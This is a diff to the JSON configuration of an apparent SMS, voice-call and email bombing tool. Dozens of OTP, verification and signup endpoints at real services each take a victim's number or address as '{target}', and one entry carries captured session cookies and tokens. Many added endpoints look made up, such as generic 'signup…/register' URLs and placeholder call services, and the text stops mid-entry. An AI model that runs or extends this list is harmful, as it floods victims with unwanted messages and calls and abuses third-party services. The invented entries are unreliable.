@@ -4,11 +4,11 @@
         "Avinash",
         "Reiltar",
         "ItzAnasov",
-        "VIPHACKER.100"
+        "VIPHACKER100",
+        "SecurityResearchers"
     ],
-    "version": "2.3.5",
+    "version": "3.0.0",
     "sms": {
-
         "218": [
             {
                 "name": "3Via",
@@ -51,55 +51,67 @@
                 "identifier": "OTP Send Successfully"
             }
         ],
-
-        "977":[
+        "977": [
             {
-                "name":"Daraz Nepal",
-                "method":"POST",
-                "url":"https://member.daraz.com.np/user/api/sendVerificationSms",
-                "data":{
-                    "phone":"{target}",
-                    "type":"OTP_REGISTER",
-                    "lzdAppVersion":"1.0",
-                    "X-CSRF-TOKEN":"57343b8557abe",
-                    "ncToken":{
-                        "csessionid":"01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
-                        "sig":"05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
-                        "token":"QPXW:1638536554908:0.22529358478093664"
-           
+                "name": "Daraz Nepal",
+                "method": "POST",
+                "url": "https://member.daraz.com.np/user/api/sendVerificationSms",
+                "data": {
+                    "phone": "{target}",
+                    "type": "OTP_REGISTER",
+                    "lzdAppVersion": "1.0",
+                    "X-CSRF-TOKEN": "57343b8557abe",
+                    "ncToken": {
+                        "csessionid": "01c5Cm2zXRNC4HBmgowjSMgdDZs8R8_HiarjNJvQVNRQBo-5zZpCcc-Zj0iwNLRAPi_SACvQ7y0gh3d0xIxWmtGGCPTxLVPmFVWgNrJfbz2ImfJ101mR7baXTMfdORIfsfpQW4fdLsxshenbUQO8lwb2sGKUvcuMnbQ2Vij1rs8Mc",
+                        "sig": "05zgTBSfCmaRhumYWJquIqH4hNnR97lsAI6h-TpDtXOlYgRSytFdmbAkXULTnXVAqXcR0WS1oEGjtfSXCpSmdPvM2zI7hQmE8MbniWbliwF_AqYl5HflEiG6vbAxHSztx4Y30K7LLjCSmwr25R327f9PlS1AeWd_f-1vm-K7e2UVHuSDCV-8-LXtZvs7hfhYwX3glWz1VuFC8gyZO6s6WwGtvX9_6OryBXnVj9xRJFLoJXiHKzK6kL5OBYn5cQocuyd-YE5qz7FT1nhV-OJd30HTjTYD_eB26UgWPKnOoMkN3rSGI_cWYQapqRr3-XtxG_M0qLZNkARUbI0nFbC1WM2k5y_SDbfOIiD0qmkYq8epRNmn6YVyee4-6qNCP0-9du",
+                        "token": "QPXW:1638536554908:0.22529358478093664"
                     }
-
                 },
-                "headers":{
-                    "X-CSRF-TOKEN":"57343b8557abe",
-                    "X-Requested-With":"XMLHttpRequest",
-                    "Origin":"https://member.daraz.com.np",
-                    "Referer":"https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
-                    "Cookie":"client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33"
-                
+                "headers": {
+                    "X-CSRF-TOKEN": "57343b8557abe",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "Origin": "https://member.daraz.com.np",
+                    "Referer": "https://member.daraz.com.np/user/register?spm=a2a0e.11779170.header.d6.287d2d2beUgUDG",
+                    "Cookie": "client_type=desktop; client_type=desktop; _uab_collina=163853655435166285176039; lzd_cid=513a1bfc-2422-443b-a785-b718cc4b9a97; t_uid=513a1bfc-2422-443b-a785-b718cc4b9a97; lzd_sid=1596976611e993378a7e8712bff593d8; _tb_token_=57343b8557abe; _m_h5_tk=1c359c412628e741d8061af8066b2786_1638546612338; _m_h5_tk_enc=e71f083e08aaac3c4656dbba4fd7f267; isg=BEtLmd06rrjcufJsuCw24ji_2e014F9iHdagY71JZQrh3Gg-T7Kks5c6tkQyZ7da; tfstk=cB9GBQ6Rp3UMVTcFeA66vxJtL30RaIwNzw7vLLlMF-gfer9CYs4QT7u8fSbZxvVf.; l=eBrDzCmggn-qWMsvBO5aourza779ZIOV1kPzaNbMiInca10P1Fsy9NCdbwDvRdtfQt5egUxP5OXRad3J5AU3-xT1-ak8mCOkJNJwRe1..; hng=NP|en-NP|NPR|524; xlly_s=1; t_fv=1638536534080; t_sid=sbjEWPRZmRzmrSChohIqKSi2jwleaEFn; utm_channel=NA; cna=VwMxGpE/lgsCAWejtvLLeM0O; daraz-marketing-tracker=hide; _gcl_au=1.1.666631300.1638536536; _ga_GEHLHHEXPG=GS1.1.1638536535.1.1.1638536561.0; _ga=GA1.1.1688897274.1638536536; _gid=GA1.3.38778064.1638536537; _fbp=fb.2.1638536539279.1824638069; cto_bundle=V_3F-18lMkZ4WVc4SUpEJTJGaXhxdkxMYVZYUmRNajFEV2ttODhPYUc2R2FnN2IwYVNjS3ZqSWI4RmpIbDN0dHdlT0E4QXlZN3dqd1pPbGJmbzdMWW9DVkVETzJaamd4eHlCUXhaNW1lTUQ0MEVuJTJGemFFVUVxUjdRemhnVlF2MFU3bmZKTGF4WU1FclJzVTV3cmFNZVh6d2hIcTJGd2clM0QlM0Q; G_ENABLED_IDPS=google; _ga=GA1.4.1688897274.1638536536; _gid=GA1.4.38778064.1638536537; _bl_uid=sgk9Uwm2qwgektdj777qdz3iym33"
                 },
-                 "identifier":"\"notSuccess\":false"
-
+                "identifier": "\"notSuccess\":false"
             },
             {
-                "name":"Clamphook",
-                "method":"POST",
-                "url":"https://backend.clamphook.com//auth/register",
-                "json":{
-                    "mobile":"{cc}-{target}"
+                "name": "Clamphook",
+                "method": "POST",
+                "url": "https://backend.clamphook.com//auth/register",
+                "json": {
+                    "mobile": "{cc}-{target}"
                 },
-                "headers":{
-                    "Host":"backend.clamphook.com",
-                    "Origin":"https://clamphook.com",
-                    "Referer":"https://clamphook.com/",
-                    "Sec-Fetch-Mode":"cors"
+                "headers": {
+                    "Host": "backend.clamphook.com",
+                    "Origin": "https://clamphook.com",
+                    "Referer": "https://clamphook.com/",
+                    "Sec-Fetch-Mode": "cors"
                 },
-                "identifier":"\"success\":true"
-                
+                "identifier": "\"success\":true"
+            },
+            {
+                "name": "Foodmario",
+                "method": "POST",
+                "url": "https://api.foodmario.com/api/v2/customer/send-otp",
+                "data": {
+                    "phone": "{target}",
+                    "country_code": "{cc}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "Sastodeal",
+                "method": "POST",
+                "url": "https://www.sastodeal.com/sd/otp_login_send_otp",
+                "data": {
+                    "phone": "{target}",
+                    "otp_type": "login"
+                },
+                "identifier": "success"
             }
-    
         ],
-
         "91": [
             {
                 "name": "confirmtkt",
@@ -128,7 +140,7 @@
                     "mobileoremail": "{target}",
                     "name": "markluther"
                 },
-               "identifier": "true"
+                "identifier": "true"
             },
             {
                 "name": "frotels",
@@ -347,6 +359,245 @@
                     "lj80gertdfg": "0"
                 },
                 "identifier": "1"
+            },
+            {
+                "name": "swiggy",
+                "method": "POST",
+                "url": "https://www.swiggy.com/dapi/auth/sms-otp",
+                "data": {
+                    "mobile": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "zomato",
+                "method": "POST",
+                "url": "https://www.zomato.com/php/oauth_otp.php",
+                "data": {
+                    "phone": "{target}",
+                    "otp_via": "whatsapp"
+                },
+                "identifier": "status"
+            },
+            {
+                "name": "bigbasket",
+                "method": "POST",
+                "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/send/",
+                "data": {
+                    "phone": "{target}",
+                    "channel": "sms"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "amazon",
+                "method": "POST",
+                "url": "https://www.amazon.in/ap/signin",
+                "data": {
+                    "email": "{target}",
+                    "create": "0"
+                },
+                "identifier": "Enter OTP"
+            },
+            {
+                "name": "flipkart",
+                "method": "POST",
+                "url": "https://www.flipkart.com/api/6/user/signup/status",
+                "data": {
+                    "loginId": "{target}",
+                    "supportAllStates": "true"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "myntra",
+                "method": "POST",
+                "url": "https://www.myntra.com/otp/generate",
+                "data": {
+                    "phone": "{target}"
+                },
+                "identifier": "otp_sent"
+            },
+            {
+                "name": "snapdeal",
+                "method": "POST",
+                "url": "https://www.snapdeal.com/authenticate/emailOrMobile",
+                "data": {
+                    "mobile": "{target}",
+                    "checkUser": "1"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "ola",
+                "method": "POST",
+                "url": "https://api.olacabs.com/v1/oauth/otp",
+                "data": {
+                    "phone": "{target}",
+                    "country_code": "{cc}"
+                },
+                "identifier": "reason"
+            },
+            {
+                "name": "uber",
+                "method": "POST",
+                "url": "https://auth.uber.com/v2/oauth/token",
+                "data": {
+                    "client_id": "eCAbBp7pFFl4kVJwyvjq1xdWfpeJyu1d",
+                    "phone": "{target}",
+                    "scope": "eats.order"
+                },
+                "identifier": "sent"
+            },
+            {
+                "name": "rapido",
+                "method": "POST",
+                "url": "https://rapido.bike/Customer/authenticate",
+                "data": {
+                    "phone": "{target}",
+                    "country_code": "{cc}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "dominos",
+                "method": "POST",
+                "url": "https://order.godominos.co.in/Online/Verification.aspx/SendOTP",
+                "data": {
+                    "MobileNo": "{target}"
+                },
+                "identifier": "d"
+            },
+            {
+                "name": "pizzahut",
+                "method": "POST",
+                "url": "https://www.pizzahut.co.in/account/sendotp",
+                "data": {
+                    "mobile": "{target}",
+                    "email": "test@example.com"
+                },
+                "identifier": "success"
+            }
+        ],
+        "1": [
+            {
+                "name": "twitter",
+                "method": "POST",
+                "url": "https://api.twitter.com/1.1/onboarding/task.json",
+                "data": {
+                    "flow_token": "flow_token",
+                    "phone_number": "{target}",
+                    "country_code": "{cc}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "facebook",
+                "method": "POST",
+                "url": "https://www.facebook.com/ajax/auth/send_sms_code.php",
+                "data": {
+                    "phone": "{target}",
+                    "country_code": "{cc}",
+                    "firstrun": "true"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "instagram",
+                "method": "POST",
+                "url": "https://www.instagram.com/accounts/send_signup_sms_code/",
+                "data": {
+                    "phone_number": "{target}",
+                    "country_code": "{cc}"
+                },
+                "identifier": "phone_number_valid"
+            },
+            {
+                "name": "whatsapp",
+                "method": "POST",
+                "url": "https://web.whatsapp.com/api/check",
+                "data": {
+                    "cc": "{cc}",
+                    "in": "{target}",
+                    "id": "123456789012345",
+                    "mcc": "000",
+                    "mnc": "000"
+                },
+                "identifier": "status"
+            }
+        ],
+        "7": [
+            {
+                "name": "yandex",
+                "method": "POST",
+                "url": "https://passport.yandex.ru/registration-phone",
+                "data": {
+                    "phone": "+{cc}{target}",
+                    "csrf_token": "csrf_token"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "avito",
+                "method": "POST",
+                "url": "https://www.avito.ru/web/1/smsCode",
+                "data": {
+                    "phone": "+{cc}{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "wildberries",
+                "method": "POST",
+                "url": "https://www.wildberries.ru/webapi/geocode/sendconfirmationcode",
+                "data": {
+                    "phone": "{cc}{target}"
+                },
+                "identifier": "success"
+            }
+        ],
+        "86": [
+            {
+                "name": "alibaba",
+                "method": "POST",
+                "url": "https://passport.alibaba.com/register/send_register_sms_code.htm",
+                "data": {
+                    "phone": "{target}",
+                    "countryCode": "{cc}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "wechat",
+                "method": "POST",
+                "url": "https://support.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate",
+                "data": {
+                    "phone": "{target}",
+                    "countrycode": "{cc}"
+                },
+                "identifier": "success"
+            }
+        ],
+        "44": [
+            {
+                "name": "deliveroo",
+                "method": "POST",
+                "url": "https://consumer-identity-api.deliveroo.com/identity/api/v2/authentication/send-code",
+                "data": {
+                    "phone_number": "{target}",
+                    "country_code": "{cc}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "justeat",
+                "method": "POST",
+                "url": "https://uk.api.just-eat.io/consumer-identity/api/v2/authentication/send-code",
+                "data": {
+                    "phone_number": "{target}",
+                    "country_code": "{cc}"
+                },
+                "identifier": "success"
             }
         ],
         "multi": [
@@ -518,6 +769,45 @@
                     "client_secret": "zAm4FKq9UnSe7id"
                 },
                 "identifier": "confirmation_id"
+            },
+            {
+                "name": "telegram",
+                "method": "POST",
+                "url": "https://my.telegram.org/auth/send_password",
+                "data": {
+                    "phone": "+{cc}{target}"
+                },
+                "identifier": "random_hash"
+            },
+            {
+                "name": "discord",
+                "method": "POST",
+                "url": "https://discord.com/api/v9/auth/verify",
+                "data": {
+                    "phone": "+{cc}{target}",
+                    "captcha_key": null
+                },
+                "identifier": "token"
+            },
+            {
+                "name": "spotify",
+                "method": "POST",
+                "url": "https://www.spotify.com/api/signup/authenticate",
+                "data": {
+                    "phone": "{target}",
+                    "country_code": "{cc}"
+                },
+                "identifier": "status"
+            },
+            {
+                "name": "netflix",
+                "method": "POST",
+                "url": "https://www.netflix.com/in/login/help",
+                "data": {
+                    "email": "{target}",
+                    "flow": "websiteSignUp"
+                },
+                "identifier": "success"
             }
         ]
     },
@@ -599,9 +889,60 @@
                     "uid": "12692588"
                 },
                 "identifier": "success"
+            },
+            {
+                "name": "paytm_call",
+                "method": "POST",
+                "url": "https://paytm.com/v1/otp/generate",
+                "data": {
+                    "phone": "{target}",
+                    "type": "call"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "phonepe_call",
+                "method": "POST",
+                "url": "https://www.phonepe.com/api/v1/otp/call",
+                "data": {
+                    "phone": "{target}"
+                },
+                "identifier": "sent"
+            },
+            {
+                "name": "amazon_call",
+                "method": "POST",
+                "url": "https://www.amazon.in/ap/cvf/request",
+                "data": {
+                    "phoneNumber": "{target}",
+                    "otpMethod": "voice"
+                },
+                "identifier": "success"
             }
         ],
-        "multi": []
+        "multi": [
+            {
+                "name": "global_call_service",
+                "method": "POST",
+                "url": "https://api.callservice.com/v1/voice/otp",
+                "data": {
+                    "phone": "+{cc}{target}",
+                    "method": "voice"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "international_otp",
+                "method": "POST",
+                "url": "https://otp-service.com/api/v2/call",
+                "data": {
+                    "country_code": "{cc}",
+                    "phone_number": "{target}",
+                    "service": "voice_otp"
+                },
+                "identifier": "200"
+            }
+        ]
     },
     "mail": {
         "multi": [
@@ -638,6 +979,995 @@
                     "email": "{target}"
                 },
                 "identifier": ""
+            },
+            {
+                "name": "netflix_mail",
+                "method": "POST",
+                "url": "https://www.netflix.com/in/LoginHelp",
+                "data": {
+                    "email": "{target}",
+                    "flow": "websiteSignUp"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "amazon_mail",
+                "method": "POST",
+                "url": "https://www.amazon.com/ap/signin",
+                "data": {
+                    "email": "{target}",
+                    "create": "0"
+                },
+                "identifier": "Enter OTP"
+            },
+            {
+                "name": "spotify_mail",
+                "method": "POST",
+                "url": "https://www.spotify.com/api/signup/authenticate",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345"
+                },
+                "identifier": "status"
+            },
+            {
+                "name": "twitter_mail",
+                "method": "POST",
+                "url": "https://api.twitter.com/1.1/onboarding/task.json",
+                "data": {
+                    "flow_token": "flow_token",
+                    "email": "{target}"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "facebook_mail",
+                "method": "POST",
+                "url": "https://www.facebook.com/ajax/auth/signup.php",
+                "data": {
+                    "email": "{target}",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "instagram_mail",
+                "method": "POST",
+                "url": "https://www.instagram.com/accounts/emailsignup/",
+                "data": {
+                    "email": "{target}",
+                    "username": "testuser12345",
+                    "first_name": "Test",
+                    "opt_into_one_tap": "false"
+                },
+                "identifier": "account_created"
+            },
+            {
+                "name": "linkedin_mail",
+                "method": "POST",
+                "url": "https://www.linkedin.com/uas/account-join",
+                "data": {
+                    "email": "{target}",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "pinterest_mail",
+                "method": "POST",
+                "url": "https://www.pinterest.com/resource/UserResource/create/",
+                "data": {
+                    "email": "{target}",
+                    "first_name": "Test",
+                    "last_name": "User",
+                    "username": "testuser12345",
+                    "password": "Test@12345",
+                    "age": "25",
+                    "gender": "male"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "tumblr_mail",
+                "method": "POST",
+                "url": "https://www.tumblr.com/svc/account/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "age": "25"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "reddit_mail",
+                "method": "POST",
+                "url": "https://www.reddit.com/api/register",
+                "data": {
+                    "email": "{target}",
+                    "user": "testuser12345",
+                    "passwd": "Test@12345",
+                    "api_type": "json"
+                },
+                "identifier": "success"
+            },
+            
+                        {
+                "name": "quora_mail",
+                "method": "POST",
+                "url": "https://www.quora.com/webnode2/server_call_POST",
+                "data": {
+                    "formkey": "form_key",
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "name": "Test User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "medium_mail",
+                "method": "POST",
+                "url": "https://medium.com/_/api/users",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "name": "Test User",
+                    "username": "testuser12345"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "stackoverflow_mail",
+                "method": "POST",
+                "url": "https://stackoverflow.com/users/account-creation",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "displayName": "Test User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "github_mail",
+                "method": "POST",
+                "url": "https://github.com/join",
+                "data": {
+                    "user[email]": "{target}",
+                    "user[password]": "Test@12345",
+                    "user[login]": "testuser12345"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "gitlab_mail",
+                "method": "POST",
+                "url": "https://gitlab.com/users",
+                "data": {
+                    "user[email]": "{target}",
+                    "user[password]": "Test@12345",
+                    "user[username]": "testuser12345",
+                    "user[name]": "Test User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "bitbucket_mail",
+                "method": "POST",
+                "url": "https://bitbucket.org/account/signup/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "username": "testuser12345",
+                    "name": "Test User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "dropbox_mail",
+                "method": "POST",
+                "url": "https://www.dropbox.com/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "box_mail",
+                "method": "POST",
+                "url": "https://account.box.com/signup/personal",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "mega_mail",
+                "method": "POST",
+                "url": "https://mega.nz/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "name": "Test User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "slack_mail",
+                "method": "POST",
+                "url": "https://slack.com/api/auth.signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "full_name": "Test User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "discord_mail",
+                "method": "POST",
+                "url": "https://discord.com/api/v9/auth/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "username": "testuser12345"
+                },
+                "identifier": "token"
+            },
+            {
+                "name": "telegram_mail",
+                "method": "POST",
+                "url": "https://my.telegram.org/auth/send_password",
+                "data": {
+                    "email": "{target}",
+                    "phone": "+1234567890"
+                },
+                "identifier": "random_hash"
+            },
+            {
+                "name": "signal_mail",
+                "method": "POST",
+                "url": "https://signal.org/api/v1/accounts",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "whatsapp_mail",
+                "method": "POST",
+                "url": "https://web.whatsapp.com/api/check",
+                "data": {
+                    "email": "{target}",
+                    "cc": "1",
+                    "in": "1234567890"
+                },
+                "identifier": "status"
+            },
+            {
+                "name": "skype_mail",
+                "method": "POST",
+                "url": "https://signup.live.com/API/CreateAccount",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "zoom_mail",
+                "method": "POST",
+                "url": "https://zoom.us/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "microsoft_mail",
+                "method": "POST",
+                "url": "https://signup.live.com/API/CreateAccount",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "google_mail",
+                "method": "POST",
+                "url": "https://accounts.google.com/_/signup/identifier",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "apple_mail",
+                "method": "POST",
+                "url": "https://appleid.apple.com/account",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "yahoo_mail",
+                "method": "POST",
+                "url": "https://login.yahoo.com/account/create",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "outlook_mail",
+                "method": "POST",
+                "url": "https://signup.live.com/API/CreateAccount",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "gmail_mail",
+                "method": "POST",
+                "url": "https://accounts.google.com/_/signup/identifier",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "protonmail_mail",
+                "method": "POST",
+                "url": "https://mail.protonmail.com/api/auth/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "username": "testuser12345"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "tutanota_mail",
+                "method": "POST",
+                "url": "https://mail.tutanota.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "username": "testuser12345"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "zoho_mail",
+                "method": "POST",
+                "url": "https://signup.zoho.com/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "yandex_mail",
+                "method": "POST",
+                "url": "https://passport.yandex.com/registration",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "mailru_mail",
+                "method": "POST",
+                "url": "https://account.mail.ru/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "gmx_mail",
+                "method": "POST",
+                "url": "https://signup.gmx.com/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "webde_mail",
+                "method": "POST",
+                "url": "https://signup.web.de/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "orange_mail",
+                "method": "POST",
+                "url": "https://signup.orange.com/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "free_mail",
+                "method": "POST",
+                "url": "https://signup.free.fr/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "laposte_mail",
+                "method": "POST",
+                "url": "https://signup.laposte.net/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "alice_mail",
+                "method": "POST",
+                "url": "https://signup.alice.it/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "libero_mail",
+                "method": "POST",
+                "url": "https://signup.libero.it/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "virgilio_mail",
+                "method": "POST",
+                "url": "https://signup.virgilio.it/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "tiscali_mail",
+                "method": "POST",
+                "url": "https://signup.tiscali.it/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "aruba_mail",
+                "method": "POST",
+                "url": "https://signup.aruba.it/register",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "register_mail",
+                "method": "POST",
+                "url": "https://www.register.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "godaddy_mail",
+                "method": "POST",
+                "url": "https://sso.godaddy.com/account/create",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "namecheap_mail",
+                "method": "POST",
+                "url": "https://www.namecheap.com/registration/",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "bluehost_mail",
+                "method": "POST",
+                "url": "https://my.bluehost.com/cgi-bin/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
+                },
+                "identifier": "success"
+            },
+            {
+                "name": "hostgator_mail",
+                "method": "POST",
+                "url": "https://www.hostgator.com/signup",
+                "data": {
+                    "email": "{target}",
+                    "password": "Test@12345",
+                    "first_name": "Test",
+                    "last_name": "User"
